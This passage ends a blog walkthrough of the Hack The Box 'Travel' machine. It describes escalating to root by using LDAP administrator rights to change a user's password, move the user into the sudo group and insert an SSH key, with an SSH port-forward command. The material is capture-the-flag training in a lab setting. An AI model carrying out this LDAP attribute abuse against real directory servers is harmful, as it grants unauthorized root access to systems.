<p><img src="/assets/images/htb-writeup-travel/image-20200519222048687.png" alt="image-20200519222048687" /></p>

<p>In the home directory, the <code class="language-plaintext highlighter-rouge">.viminfo</code> file contains a password.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519222239619.png" alt="image-20200519222239619" /></p>

<p>We’re now able to pull a list of users from the LDAP server:</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519222401264.png" alt="image-20200519222401264" /></p>

<p>This machine has a special NSS configuration that uses the LDAP server to fetch additional user information.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519222448512.png" alt="image-20200519222448512" /></p>

<p>We can see the effective user list with the <code class="language-plaintext highlighter-rouge">getent</code> command:</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519222604273.png" alt="image-20200519222604273" /></p>

<h2 id="ldap-users-attribute-modification">LDAP users attribute modification</h2>

<p>We can probably modify the users attributes in the LDAP since our user is an LDAP administrator. The user records look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dn: uid=gloria,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: gloria
uidNumber: 5010
homeDirectory: /home/gloria
givenName: Gloria
gidNumber: 5000
sn: Wood
cn: Gloria Wood
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
loginShell: /bin/bash
</code></pre></div></div>

<p>I tried changing the uid by renaming the user but we don’t have access to do that. To make changes we can use LDIF files or use a tool like Apache Directory Studio.</p>

<p>I’ll reconnect my SSH and enable port-forward so I can reach the LDAP server directory from my machine: <code class="language-plaintext highlighter-rouge">sudo ssh -L 389:172.20.0.10:389 lynik-admin@10.10.10.189</code></p>

<p>First, we’ll set the user’s password to <code class="language-plaintext highlighter-rouge">welcome123</code>.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519223414929.png" alt="image-20200519223414929" /></p>

<p>Then we’ll change the Group ID to 27 (sudo) so our user will be able to become root once we have a shell.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519223450128.png" alt="image-20200519223450128" /></p>

<p>To add an SSH public key, we need to add the <strong>ldapPublicKey</strong> object class first.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519223537871.png" alt="image-20200519223537871" /></p>

<p>Then we can add the <strong>sshPublic</strong> attribute and put our SSH key there.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519223658288.png" alt="image-20200519223658288" /></p>

<h2 id="last-step-to-root">Last step to root</h2>

<p>Now we can SSH to the server using RSA authentication then use the sudo command with the <code class="language-plaintext highlighter-rouge">welcome123</code> password we set earlier in the LDAP server.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519223748937.png" alt="image-20200519223748937" /></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#deserialization" class="page__taxonomy-item" rel="tag">deserialization</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#git" class="page__taxonomy-item" rel="tag">git</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#gopher" class="page__taxonomy-item" rel="tag">gopher</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ldap" class="page__taxonomy-item" rel="tag">ldap</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#memcache" class="page__taxonomy-item" rel="tag">memcache</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#nss" class="page__taxonomy-item" rel="tag">nss</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">php</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ssrf" class="page__taxonomy-item" rel="tag">ssrf</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#vhosts" class="page__taxonomy-item" rel="tag">vhosts</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#viminfo" class="page__taxonomy-item" rel="tag">viminfo</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-09-05T00:00:00+02:00">September 05, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-remote/" class="pagination--pager" title="Remote - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-multimaster/" class="pagination--pager" title="Multimaster - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
